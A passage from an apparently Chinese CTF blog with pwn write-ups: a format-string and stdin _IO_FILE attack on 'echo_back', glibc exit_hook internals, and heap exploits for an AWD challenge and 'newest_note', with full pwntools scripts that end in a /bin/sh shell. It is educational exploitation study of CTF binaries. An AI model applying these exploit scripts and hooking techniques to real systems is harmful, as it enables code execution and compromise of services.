[rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  sub_A10(a1, a2, a3);  alarm(0x3Cu);  sub_A53();  v4 = 0;  memset(s, 0, sizeof(s));  while ( 1 )  &#123;    while ( 1 )    &#123;      result = menu();      if ( result != 2 )        break;      printf_vuln(s);    &#125;    if ( result == 3 )      break;    if ( result == 1 &amp;&amp; !v4 )    &#123;      set_name(s);      v4 = 1;    &#125;  &#125;  return result;&#125;\n\nssize_t __fastcall set_name(void *a1)&#123;  printf(&quot;name:&quot;);  return read(0, a1, 7uLL);&#125;\n\nunsigned __int64 __fastcall printf_vuln(const char *a1)&#123;  size_t nbytes; // [rsp+1Ch] [rbp-14h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  memset(&amp;nbytes + 4, 0, sizeof(size_t));  printf(&quot;length:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  getchar();  if ( (nbytes &amp; 0x80000000) != 0LL || nbytes &gt; 6 )    LODWORD(nbytes) = 7;  read(0, &amp;nbytes + 4, nbytes);  if ( *a1 )    printf(&quot;%s say:&quot;, a1);  else    printf(&quot;anonymous say:&quot;);  printf(&amp;nbytes + 4);  return __readfsqword(0x28u) ^ v3;&#125;\n\n整体流程就是你先设置名字然后说一句话\n漏洞分析漏洞点在printf_vuln函数里面，存在很明显的格式化字符串的漏洞\n\n在里面存在几处可以利用的信息(我这是manjaro所以__libc_start_main的地址有区别，但是不影响，后续还是要用ubuntu调试)，目前就是我们可以泄漏libc地址，可以泄漏程序地址。\n但是问题是我们输入的内容只能是七个字符，所以需要攻击scanf。\n_IO_FIELtypedef struct _IO_FILE FILE;   /* Standard streams.  */  extern struct _IO_FILE *stdin;      /* Standard input stream.  */  extern struct _IO_FILE *stdout;     /* Standard output stream.  */  extern struct _IO_FILE *stderr;     /* Standard error output stream.  */  #ifdef __STDC__  /* C89/C99 say they&#x27;re macros.  Make them happy.  */  #define stdin stdin  #define stdout stdout  #define stderr stderr  #endif \n\n_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;  _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;  _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; \n\n可以看出存在三个文件指针\n文件读取过程:_IO_new_file_underflow这个函数调用_IO_SYSREAD这个函数来实现的\nint _IO_new_file_underflow (_IO_FILE *fp)&#123;  _IO_ssize_t count;  ...  if (fp-&gt;_flags &amp; _IO_NO_READS)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  ## 如果输入缓冲区里存在数据，则直接返回  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    return *(unsigned char *) fp-&gt;_IO_read_ptr;  ...  if (fp-&gt;_IO_buf_base == NULL)    &#123;      ...      _IO_doallocbuf (fp);    &#125;  ...  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end    = fp-&gt;_IO_buf_base;  ##调用_IO_SYSREAD函数最终执行系统调用读取数据  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  ...  ## 设置结构体指针  fp-&gt;_IO_read_end += count;  ...  return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n\n\n再就是_IO_FILE这个结构。结合上面的函数可以看出来，_IO_SYSREAD函数是将数据写到_IO_buf_base这个位置，大小是_IO_buf_end-_IO_buf_end。\n\n可以看到这个_IO_2_1_stdin_的地址为0x7f680bbe48e0\n虽然我们格式化字符串想要直接修改到我们想要的地方是不得行的，但是我们可以将_IO_buf_base的内容的最后一个字节删去，这样地址就变成了0x7f680bbe4900计算一下发现到了_IO_write_base的地址，我就可以进一步修改这个结构内部的数据了。\n我们该怎么去删除_IO_buf_base最后一个字节呢？题目还给了一个setname函数，这个函数我们写入的参数也是存在在栈上的，所以一样可以使用格式化字符串，但是只允许有七个字节，但是一般地址都存在有\\x00位，又因为是小端序，所以直接写入就好。\nexpfrom pwn import *# from LibcSearcher import *elf = ELF(&#x27;./echo_back&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./echo_back&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 63836)# context.log_level = &#x27;debug&#x27;_IO_2_1_stdin_ = libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]def printf_vuln(content):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;8&#x27;)    r.send(content)def setName(name):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.send(name)def exit():    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)printf_vuln(b&#x27;%19$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)libc_start_main = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)-0xf0print(libc_start_main)libc_base = libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))_IO_2_1_stdin_addr = libc_base+_IO_2_1_stdin__IO_buf_addr = _IO_2_1_stdin_addr+0x8*7print(&quot;_IO_buf_addr:&quot;, hex(_IO_buf_addr))print(&quot;_IO_2_1_stdin_addr:&quot;, hex(_IO_2_1_stdin_addr))printf_vuln(b&#x27;%13$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_ret_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)elf_base = main_ret_addr-0xd08print(elf_base)pop_rdi_addr = 0x0000000000000d93+elf_baseprintf_vuln(b&#x27;%12$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_rbp_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)print(main_rbp_addr)setName(p64(_IO_buf_addr))printf_vuln(b&#x27;%16$hhn&#x27;)# gdb.attach(r)payload = p64(_IO_2_1_stdin_addr+0x83)*3 + \\    p64(main_rbp_addr+8)+p64(main_rbp_addr+8+8*3)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)for i in range(0, len(payload)-1):    print(i)    r.recvuntil(b&#x27;choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;&#x27;)    # gdb.attach(r)payload = p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)exit()r.interactive()\n\nexp中的循环是因为这条源代码\nif (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  return *(unsigned char *) fp-&gt;_IO_read_ptr;\n\n我没在修改结构体就会执行\nfp-&gt;_IO_read_end += count;\n\n所以需要绕过这条if语句\n在getchar内部有这样一条语句，所以循环绕过就行\nfp-&gt;_IO_read_end++\n\n\n\n\n\n参考博客:\nhttps://blog.csdn.net/weixin_44145820/article/details/104629998\nhttps://blog.csdn.net/seaaseesa/article/details/103114909\n","categories":["pwn-xctf"],"tags":["_IO_FILE"]},{"title":"exit_hook","url":"/2022/06/18/exit-hook/","content":"众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。\nexit_hook首先呢，程序正常退出以及使用exit函数都会调用exit所以不仅限于存在exit的题目适合\n源码分析void    exit (int status)&#123;    __run_exit_handlers (status, &amp;__exit_funcs, true, true);&#125;libc_hidden_def (exit)\n\nexit函数就只是单纯的调用了另一个函数，重点还是在另一个函数上面\nvoid    attribute_hidden    __run_exit_handlers (int status, struct exit_function_list **listp,                         bool run_list_atexit, bool run_dtors)&#123;    /* First, call the TLS destructors.  */    #ifndef SHARED    if (&amp;__call_tls_dtors != NULL)        #endif        if (run_dtors)            __call_tls_dtors ();    /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call     everyone on the list and use the status value in the last     exit (). */    while (true)    &#123;        struct exit_function_list *cur;        __libc_lock_lock (__exit_funcs_lock);        restart:        cur = *listp;        if (cur == NULL)        &#123;            /* Exit processing complete.  We will not allow any more\t     atexit/on_exit registrations.  */            __exit_funcs_done = true;            __libc_lock_unlock (__exit_funcs_lock);            break;        &#125;        while (cur-&gt;idx &gt; 0)        &#123;            struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];            const uint64_t new_exitfn_called = __new_exitfn_called;            /* Unlock the list while we call a foreign function.  */            __libc_lock_unlock (__exit_funcs_lock);            switch (f-&gt;flavor)            &#123;                    void (*atfct) (void);                    void (*onfct) (int status, void *arg);                    void (*cxafct) (void *arg, int status);                case ef_free:                case ef_us:                    break;                case ef_on:                    onfct = f-&gt;func.on.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (onfct);                    #endif                    onfct (status, f-&gt;func.on.arg);                    break;                case ef_at:                    atfct = f-&gt;func.at;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (atfct);                    #endif                    atfct ();                    break;                case ef_cxa:                    /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\t\t we must mark this function as ef_free.  */                    f-&gt;flavor = ef_free;                    cxafct = f-&gt;func.cxa.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (cxafct);                    #endif                    cxafct (f-&gt;func.cxa.arg, status);                    break;            &#125;            /* Re-lock again before looking at global state.  */            __libc_lock_lock (__exit_funcs_lock);            if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))                /* The last exit function, or another thread, has registered\t       more exit functions.  Start the loop over.  */                goto restart;        &#125;        *listp = cur-&gt;next;        if (*listp != NULL)            /* Don&#x27;t free the last element in the chain, this is the statically\t   allocate element.  */            free (cur);        __libc_lock_unlock (__exit_funcs_lock);    &#125;    if (run_list_atexit)        RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n这里先将源码放在这里，因为但看源码看不出什么\n\n但是通过调试可以看到这里是调用了_dl_fini函数，而这个函数在house of banana中提到过并且适用libc的版本还挺高在glibc2.34都是可以使用的。\nvoid    _dl_fini (void)&#123;    /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */    /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */    #ifdef SHARED    int do_audit = 0;    again:    #endif    for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;        /* Protect against concurrent loads and unloads.  */        __rtld_lock_lock_recursive (GL(dl_load_lock));        unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;        /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */        if (nloaded == 0            #ifdef SHARED            || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit            #endif           )            __rtld_lock_unlock_recursive (GL(dl_load_lock));        else        &#123;            /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */            struct link_map *maps[nloaded];            unsigned int i;            struct link_map *l;            assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)                /* Do not handle ld.so in secondary namespaces.  */                if (l == l-&gt;l_real)                &#123;                    assert (i &lt; nloaded);                    maps[i] = l;                    l-&gt;l_idx = i;                    ++i;                    /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */                    ++l-&gt;l_direct_opencount;                &#125;            assert (ns != LM_ID_BASE || i == nloaded);            assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);            unsigned int nmaps = i;            /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */            _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),                           NULL, true);            /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */            __rtld_lock_unlock_recursive (GL(dl_load_lock));            /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */            for (i = 0; i &lt; nmaps; ++i)            &#123;                struct link_map *l = maps[i];                if (l-&gt;l_init_called)                &#123;                    /* Make sure nothing happens if we are called twice.  */                    l-&gt;l_init_called = 0;                    /* Is there a destructor function?  */                    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL                        || l-&gt;l_info[DT_FINI] != NULL)                    &#123;                        /* When debugging print a message first.  */                        if (__builtin_expect (GLRO(dl_debug_mask)                                              &amp; DL_DEBUG_IMPCALLS, 0))                            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                                              DSO_FILENAME (l-&gt;l_name),                                              ns);                        /* First see whether an array is given.  */                        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)                        &#123;                            ElfW(Addr) *array =                                (ElfW(Addr) *) (l-&gt;l_addr                                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);                            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                                              / sizeof (ElfW(Addr)));                            while (i-- &gt; 0)                                ((fini_t) array[i]) ();                        &#125;                        /* Next try the old-style destructor.  */                        if (l-&gt;l_info[DT_FINI] != NULL)                            DL_CALL_DT_FINI                            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);                    &#125;                    #ifdef SHARED                    /* Auditing checkpoint: another object closed.  */                    if (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; 0, 0))                    &#123;                        struct audit_ifaces *afct = GLRO(dl_audit);                        for (unsigned int cnt = 0; cnt &lt; GLRO(dl_naudit); ++cnt)                        &#123;                            if (afct-&gt;objclose != NULL)                            &#123;                                struct auditstate *state                                    = link_map_audit_state (l, cnt);                                /* Return value is ignored.  */                                (void) afct-&gt;objclose (&amp;state-&gt;cookie);                            &#125;                            afct = afct-&gt;next;                        &#125;                    &#125;                    #endif                &#125;                /* Correct the previous increment.  */                --l-&gt;l_direct_opencount;            &#125;        &#125;    &#125;    #ifdef SHARED    if (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; 0)    &#123;        do_audit = 1;        goto again;    &#125;    if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))        _dl_debug_printf (&quot;\\nruntime linker statistics:\\n&quot;                          &quot;           final number of relocations: %lu\\n&quot;                          &quot;final number of relocations from cache: %lu\\n&quot;,                          GL(dl_num_relocations),                          GL(dl_num_cache_relocations));    #endif&#125;\n\n上面就是_dl_fini函数，这次重点关注的是这一段代码\n#ifdef SHAREDint do_audit = 0;again:#endiffor (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)&#123;    /* Protect against concurrent loads and unloads.  */    __rtld_lock_lock_recursive (GL(dl_load_lock));    unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;    /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */    if (nloaded == 0        #ifdef SHARED        || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit        #endif       )        __rtld_lock_unlock_recursive (GL(dl_load_lock));    ... ...&#125;\n\n下面给出两种函数的定义\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#  define GL(name) _rtld_global._##name\n\n可以看出来这里是将_rtld_global当中的属性当作函数来进行调用的\n\n然而这俩属性也就是俩指针，所以我们可以修改这个指针到system，接着就是构造参数了。根据上面的调用关系可以看到最后的参数其实是\n\n以上其实就是exit_hook的全部了，很简单。\n新的发现&#123;    ... ...        if (run_list_atexit)            RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n在上面的__run_exit_handlers 函数当中存在以上代码\n# define RUN_HOOK(NAME, ARGS)\t\t\t\t\t\t      \\do &#123;\t\t\t\t\t\t\t\t\t      \\  void *const *ptr;\t\t\t\t\t\t      \\  for (ptr = (void *const *) symbol_set_first_element (NAME);\t\t      \\       ! symbol_set_end_p (NAME, ptr); ++ptr)\t\t\t\t      \\    (*(__##NAME##_hook_function_t *) *ptr) ARGS;\t\t\t      \\&#125; while (0)\n\n跟进发现是可以循环执行内容的一个函数，所以这里如果可以修改掉__libc_atexit就可以getshell。\n然后实际的做题过程中会发现并没有__libc_atexit这个符号，因为这不是一个全局变量，所以是找不到的，但是通过汇编分析\n\n可以发现是这条语句在调用hook\n\n在最后的实际调用也可以看到确实是这样的，这里的rbx也就是上面的__libc_atexit指针。\n总结以上利用方式在最后总结一下以上两种利用方式，第一种利用方式的攻击层面其实是发生在ld层面的，所以也就存在了一些奇奇怪怪的因素(至少当初写house of banana总是会出现)但是这一种利用方式是可以我们控制其参数的。第二种利用方式就发生在libc层面了，所以我们修改起来也就更加的得心应手一点，不过坏处就是我们没法控制其参数。\n一次awd训练的pwn题目的漏洞很明显，在delete函数存在UAF，并且在edit函数存在堆溢出，不过恶心的是没有show函数并且题目使用的输出函数都是write导致我们没法使用_IO_FILE来进行泄漏，虽然glibc的版本是2.27但是malloc_hook和free_hook初始值都是0没法进行partial write所以这里就需要使用到exit_hook了。\n这里因为漏洞点很简单就不一步一步分析了，就是实现unsored bin和tcache中存在同一使用的chunk，进行partial write达成以下情况\n\n然后利用同样的方法修改掉他的参数也就是_rtld_global._dl_load_lock.mutex 的值为/bin/sh\\x00即可\nexpfrom pwn import *elf = ELF(&quot;./pwn&quot;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, data=b&#x27;\\n&#x27;):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)def delete(idx):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, size, data):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)exit_hook = 0x62af60while 1:    r = process(&#x27;./pwn&#x27;)    try:        # r = process(&#x27;./pwn&#x27;)        create(0x100)        create(0x100)        for i in range(8):            edit(0, 16, flat(0, 0))            delete(0)        create(0x80, b&#x27;\\x60\\xaf\\x82&#x27;)        create(0x100)        create(0x100, b&#x27;\\x20\\xf4\\x24&#x27;)        create(0x110)        create(0x110)        for i in range(8):            edit(5, 16, flat(0, 0))            delete(5)        create(0x90, b&#x27;\\x68\\xa9\\x82&#x27;)        create(0x110)        create(0x110, b&#x27;/bin/sh\\x00&#x27;)        r.recvuntil(b&#x27;Your choice :&#x27;)        # gdb.attach(r)        r.sendline(b&#x27;4&#x27;)        r.interactive()    except:        r.close()\n\n国赛newest_note这道题目其实存在一个非常明显，可惜当时我没有发现的漏洞\ndword_4198 = input_int();chunk_arr = malloc(8 * dword_4198);\n\n也就是在开始的时候可以创建任意大小的chunk，所以可以直接泄露地址，不过即便是没注意到这个漏洞也是可以做题的，不过因为没有接触过exit_hook所以我当时的思路是劫持栈进行ROP，后面发现实现不了。\n在不用mmap生成chunk泄露的情况下在glibc-2.27_ubuntu1.2_amd64之后tcache就存在double free的检测了，结合题目这里是没法直接在tcache当中进行double free的，所以我们只能将double free发生在fastbin当中\n解题思路使用这种方法其实是比较麻烦的，首先将tcache占满，那么下一次释放的chunk会进入fastbin，然后create一个chunk，拿出tcache中的一个chunk，接着再释放一次fastbin当中的chunk，就达到了在tcacheh和fastbin当中存在同一个chunk的情况了，接着伪造fastbin，利用fastbin_reverse_into_tcache将伪造的链放入tcache即可进一步利用了。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(b&#x27;45&#x27;)for i in range(19):    create(i, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)for i in range(8):    delete(i)create(8, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;)) &lt;&lt; 12print(&#x27;heap_base=&gt;&#x27;, hex(heap_base))print(hex((heap_base + 0x610) &gt;&gt; 12))key = heap_base &gt;&gt; 12create(18, p64(key ^ (heap_base + 0x560)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x480)))create(19, b&#x27;\\n&#x27;)create(19, b&#x27;\\n&#x27;)create(19, p64(key ^ (heap_base + 0x460)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x420)))create(19, b&#x27;a&#x27; * 0x20 + p64(key))create(20, b&#x27;\\n&#x27;)create(21, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x441))delete(1)show(1)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))&#x27;&#x27;&#x27;0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)constraints:  [r15] == NULL || r15 == NULL  [r12] == NULL || r12 == NULL0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)constraints:  [r15] == NULL || r15 == NULL  [rdx] == NULL || rdx == NULL0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)constraints:  [rsi] == NULL || rsi == NULL  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(30, b&#x27;a&#x27; * 0x20 + p64(libc_atexit ^ key))create(31, b&#x27;\\n&#x27;)create(32, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n在mmap生成chunk的情况下解题思路在这个情况下其实就更加简单了，因为这里直接泄露了libc地址，所以我们不需要想上面那样构造fake tcache，我们只需要拿到double free即可，这里因为可以直接少用一次free所以我们可以直接在fastbin当中进行double free。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(bytes(str(0x40040000), encoding=&#x27;utf-8&#x27;))show(0x8339a)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))for i in range(9):    create(i, b&#x27;\\n&#x27;)for i in range(8):    delete(i)delete(8)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)key = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;))print(hex(key))for i in range(7):    create(i, b&#x27;\\n&#x27;)one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(7, p64(libc_atexit ^ key))create(8, b&#x27;\\n&#x27;)create(8, b&#x27;\\n&#x27;)create(9, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n总结这里从源码层面解释了两种exit_hook，并且在例题中两种方式都是使用了，国赛的这道题目是很简单的，我也想到第一种方法了，不过就是因为存在知识点的遗漏导致没做出来，也是在看了wp之后才了解了exit_hook，所以基础知识还是很重要不然思路会受到限制。第一道例题如果有需要可以评论。\n","categories":["pwn"],"tags":["堆利用"]},{"title":"fastbin_reverse_into_tcache","url":"/2022/05/26/fastbin-reverse-into-tcache/","content":"这一利用方式是一种类似于unsorted bin，tcache stashing unlink attack可以在任意地址写入堆地址的漏洞。\n源码分析if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))&#123;    idx = fastbin_index (nb);    mfastbinptr *fb = &amp;fastbin (av, idx);    mchunkptr pp;    victim = *fb;    if (victim != NULL)    &#123;        if (SINGLE_THREAD_P)            *fb = victim-&gt;fd;        else            REMOVE_FB (fb, pp, victim);        if (__glibc_likely (victim != NULL))        &#123;            size_t victim_idx = fastbin_index (chunksize (victim));            if (__builtin_expect (victim_idx != idx, 0))                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);            check_remalloced_chunk (av, victim, nb);            #if USE_TCACHE            /* While we&#x27;re here, if we see other chunks of the same size,\t\t stash them in the tcache.  */            size_t tc_idx = csize2tidx (nb);            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)            &#123;                mchunkptr tc_victim;                /* While bin not empty and tcache not full, copy chunks.  */                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                       &amp;&amp; (tc_victim = *fb) != NULL)                &#123;                    if (SINGLE_THREAD_P)                        *fb = tc_victim-&gt;fd;                    else                    &#123;                        REMOVE_FB (fb, pp, tc_victim);                        if (__glibc_unlikely (tc_victim == NULL))                            break;                    &#125;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;            #endif            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到在源码中，如果tcache不为空，那么就会从fastbin的fd指针指向的chunk开始往tcache内放入chunk。如果我们能够将最后一个堆地址的fd指针改成我们的目标地址即可实现任意地址写了。\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  